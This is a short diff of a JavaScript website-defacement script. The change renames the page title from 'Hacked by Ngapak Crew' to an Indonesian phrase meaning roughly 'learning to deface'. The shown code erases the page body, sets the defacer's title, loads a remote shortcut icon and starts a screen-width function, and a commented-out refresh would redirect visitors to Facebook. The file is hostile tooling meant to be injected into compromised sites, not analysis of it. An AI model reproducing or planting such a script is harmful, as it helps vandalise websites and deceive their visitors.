@@ -5,7 +5,7 @@
 <META HTTP-EQUIV="refresh" CONTENT="0;URL=http://www.facebook.com/?v=wall/">
 */
 document.getElementsByTagName('body')[0].innerHTML=""
-document.title="Hacked by Ngapak Crew"
+document.title="mas hawk belajar deface"
 var shortc=document.createElement("link");shortc.rel="SHORTCUT ICON";shortc.href="http://i.imgur.com/QYUFm5u.png";document.getElementsByTagName("head")[0].appendChild(shortc)
 function muter2(){
 scrW=screen.availWidth
